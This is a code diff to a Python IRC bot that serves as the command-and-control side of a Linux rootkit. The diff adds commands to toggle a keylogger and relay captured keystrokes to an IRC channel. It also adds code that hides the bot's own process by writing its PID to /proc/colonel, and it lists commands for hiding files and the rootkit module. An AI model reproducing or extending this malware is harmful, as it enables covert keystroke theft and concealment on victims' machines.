@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-#
+# HIDE NETSTAT INFO --- READBUFFER NEEDS TO BE BIGGER, OR SEND VIA TCP. MISSING TEXT
 # Example program using irc.bot.
 #
 # Joel Rosdahl <joel@rosdahl.net>
@@ -23,21 +23,20 @@ Bot commands are:
     -------dcc -- Command a bot DCC CHAT invite connection.
 
     ROOT COMMANDS -------
+    tls -- Toggle keylogger on/off. 
+    keylog -- Print keyboard input log. 
+              If keylogger is on, toggle will be set to 0.
     hpXXXX -- Hide a process id.
     sp -- Show the last hidden process.
-    tls -- Toggle keylogger on/off. 
     thf -- Toggle files show/hide.
     mh -- Hide the root module. 
     ms -- Show the root module.
-
-    LOG COMMANDS -------
-    keylog -- Print keyboard input log.
 """
 
 import irc.bot
 import irc.strings
 from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
-from os import remove
+from os import getpid
 
 import key
 
@@ -109,7 +108,7 @@ class Bot(irc.bot.SingleServerIRCBot):
     # Translate and print the keylog to console. Once finished, deletes file.
     def keylogs(self):
         evlog = '/opt/col_log/evlog.txt'
-        log = open(evlog, 'w+')
+        log = open(evlog, 'r+')
         f = log.read()
         kl = key.translate(f)
         log.truncate()
@@ -121,7 +120,7 @@ class Bot(irc.bot.SingleServerIRCBot):
     def error_log(self):
         # SEND ERROR LOG VIA DCC THEN DELETE
         # errlog = '/opt/col_log/log.txt'
-        # f = open(errlog, 'w+')
+        # f = open(errlog, 'r+')
         # f.truncate()
         # f.close()
         pass
@@ -184,10 +183,24 @@ class Bot(irc.bot.SingleServerIRCBot):
                 if debug:
                     print "%s" % line
         elif "keylog" == cmd:
+            self.root_command(cmd)
+            c.notice(channel, "Command %s executed." % cmd)
             for k in self.keylogs().split('\n'):
-                c.notice(channel, k)
+                if None == k:
+                    c.notice(channel, "Log empty.")
+                else:
+                    c.notice(channel, k)
                 if debug:
-                    print k
+                    print "Command %s executed." % cmd
+                    if None == k:
+                        print "Log empty."
+                    else:
+                        print k
+            status = self.root_status()
+            for line in status:
+                c.notice(channel, line)
+                if debug:
+                    print "%s" % line
         elif "help" == cmd:
             if debug:
                 print """
@@ -198,15 +211,14 @@ disconnect -- Disconnect the bot. The bot will try to reconnect
 die -- Kill the bot.
 
 ROOT COMMANDS -------
+tls -- Toggle keylogger on/off. 
+keylog -- Print keyboard input log.
+          If keylogger is on, toggle will be set to 0.
 hpXXXX -- Hide a process id.
 sp -- Show the last hidden process.
-tls -- Toggle keylogger on/off. 
 thf -- Toggle files show/hide.
 mh -- Hide the root module (default). 
 ms -- Show the root module.
-
-LOG COMMANDS -------
-keylog -- Print keyboard input log.
 """
 
             c.notice(channel, "BOT COMMANDS --------")
@@ -214,14 +226,13 @@ keylog -- Print keyboard input log.
             c.notice(channel, "disconnect -- Disconnect the bot. The bot will try to reconnect after 60 seconds.")
             c.notice(channel, "die -- Kill the bot.")
             c.notice(channel, "ROOT COMMANDS -------")
+            c.notice(channel, "tls -- Toggle keylogger on/off (default is off).")
+            c.notice(channel, "keylog -- Print keyboard input log. If keylogger is on, toggle will be set to 0.")
             c.notice(channel, "hpXXXX -- Hide a process id.")
             c.notice(channel, "sp -- Show the last hidden process.")
-            c.notice(channel, "tls -- Toggle keylogger on/off (default is off).")
             c.notice(channel, "thf -- Toggle files show/hide  (default is hide).")
             c.notice(channel, "mh -- Hide the root module (default).")
             c.notice(channel, "ms -- Show the root module.")
-            c.notice(channel, "LOG COMMANDS -------")
-            c.notice(channel, "keylog -- Print keyboard input log.")
         else:
             if debug:
                 print nick, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname)
@@ -230,6 +241,12 @@ keylog -- Print keyboard input log.
 
 def main():
     colbot = Bot(channel, nickname, server, port)
+
+    # Hide the bot's PID.
+    bot_pid = "hp" + str(getpid())
+    f = open('/proc/colonel', 'w')
+    f.write(bot_pid)
+    f.close()
 
     if debug:
         print "Connecting to %s on port: %d" % (server, port)
